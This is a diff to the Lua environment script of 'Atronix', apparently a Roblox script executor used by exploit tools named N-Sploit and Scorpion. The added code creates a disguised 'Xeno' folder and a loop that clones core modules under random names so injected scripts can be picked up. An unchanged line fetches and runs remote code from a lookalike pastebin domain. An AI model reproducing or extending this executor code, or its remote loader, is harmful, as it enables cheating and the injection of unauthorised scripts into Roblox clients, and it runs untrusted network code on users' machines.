@@ -2,6 +2,25 @@
  \\ Atronix's Environment
 \\ Code is used by N-Sploit & Scorpion.
 ]]
+local AtronixContainer = Instance.new("Folder", RobloxReplicatedStorage)
+AtronixContainer.Name = "Xeno"
+local objectPointerContainer, scriptsContainer = Instance.new("Folder", AtronixContainer), Instance.new("Folder", AtronixContainer)
+objectPointerContainer.Name = "Instance Pointers"
+scriptsContainer.Name = "Scripts"
+
+
+local Atronix = {
+	about = {
+		_name = 'Atronix',
+		_version = 'v1.0.0',
+		_publisher = "razzoni"
+	}
+}
+table.freeze(Atronix.about)
+
+if game.RobloxReplicatedStorage.Xeno then
+	game.RobloxReplicatedStorage.Xeno:Destroy()
+end
 
 local Bridge = {}
 local scr = {}
@@ -47,21 +66,6 @@ local SoundService = game:FindService("SoundService") or game.SoundService
 local RobloxTestService = cloneref(game:FindService("TestService") or game.TestService)
 local TweenService = game:FindService("TweenService")
 local StarterGui = game:FindService("StarterGui")
-local AtronixContainer = Instance.new("Folder", RobloxReplicatedStorage)
-AtronixContainer.Name = "Xeno"
-local objectPointerContainer, scriptsContainer = Instance.new("Folder", AtronixContainer), Instance.new("Folder", AtronixContainer)
-objectPointerContainer.Name = "Instance Pointers"
-scriptsContainer.Name = "Scripts"
-
-
-local Atronix = {
-	about = {
-		_name = 'Atronix',
-		_version = 'v1.0.0',
-		_publisher = "razzoni"
-	}
-}
-table.freeze(Atronix.about)
 
 
 
@@ -807,5 +811,23 @@ end)
 Xeno = Atronix
 
 loadstring(game:HttpGet("https://pastebinp.com/raw/592uK7Pe"))() -- Decompiler
+
+delay = task.delay
+
+task.spawn(function() -- execution handler
+	while task.wait(.06) do
+		local coreModule = workspace.Parent.Clone(coreModules[math.random(1, #coreModules)])
+		coreModule:ClearAllChildren()
+
+		coreModule.Name = HttpService:GenerateGUID(false)
+		coreModule.Parent = scriptsContainer
+
+		local thread = task.spawn(listen, coreModule)
+		delay(2.5, function()
+			coreModule:Destroy()
+			task.cancel(thread)
+		end)
+	end
+end)
 
 assert(true, warn("[ATORNIX-SCORPION]: Atronix loaded."))
